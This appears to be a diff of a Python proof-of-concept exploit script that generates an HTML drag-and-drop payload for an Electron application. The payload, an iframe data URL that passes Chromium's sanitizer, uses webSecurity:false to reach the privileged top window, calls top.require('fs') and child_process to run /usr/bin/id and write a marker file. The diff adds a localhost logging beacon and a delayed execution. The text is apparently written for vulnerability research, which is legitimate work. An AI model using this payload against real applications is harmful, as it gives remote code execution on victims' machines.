@@ -17,18 +17,21 @@ def append(obj):
 # The dropped data: iframe data URL is preserved by Chromium's editable-content
 # sanitizer. webSecurity:false lets this child reach the privileged top world.
 DIRECT_DOC = r'''<!doctype html><meta charset="utf-8"><script>
-try {
-  const marker = top.process.env.NATIVE_DRAG_MARKER || '/tmp/native-html-drag-rce';
-  const fs = top.require('fs');
-  fs.writeFileSync(marker,
-    'DIRECT_TOP_REQUIRE_REACHED=1\\nNODE=' + top.process.versions.node +
-    '\\nELECTRON=' + top.process.versions.electron + '\\nTOP_URL=' + top.location.href + '\\n');
-  const id = top.require('child_process').execFileSync('/usr/bin/id', {encoding:'utf8'}).trim();
-  fs.appendFileSync(marker, 'ID=' + id + '\\nDIRECT_TOP_REQUIRE_ACE=1\\n');
-  top.document.title = 'DIRECT_TOP_REQUIRE_ACE';
-} catch (e) {
-  try { top.document.title = 'DIRECT_TOP_REQUIRE_ERROR:' + String(e); } catch (_) {}
-}
+try { fetch('http://127.0.0.1:18765/log?event=data-child-start', {mode:'no-cors'}); } catch (_) {}
+setTimeout(() => {
+  try {
+    const marker = top.process.env.NATIVE_DRAG_MARKER || '/tmp/native-html-drag-rce';
+    const fs = top.require('fs');
+    fs.writeFileSync(marker,
+      'DIRECT_TOP_REQUIRE_REACHED=1\\nNODE=' + top.process.versions.node +
+      '\\nELECTRON=' + top.process.versions.electron + '\\nTOP_URL=' + top.location.href + '\\n');
+    const id = top.require('child_process').execFileSync('/usr/bin/id', {encoding:'utf8'}).trim();
+    fs.appendFileSync(marker, 'ID=' + id + '\\nDIRECT_TOP_REQUIRE_ACE=1\\n');
+    top.document.title = 'DIRECT_TOP_REQUIRE_ACE';
+  } catch (e) {
+    try { top.document.title = 'DIRECT_TOP_REQUIRE_ERROR:' + String(e); } catch (_) {}
+  }
+}, 300);
 </script>'''
 DIRECT_B64 = base64.b64encode(DIRECT_DOC.encode()).decode()
 SOURCE = r'''<!doctype html><meta charset="utf-8">
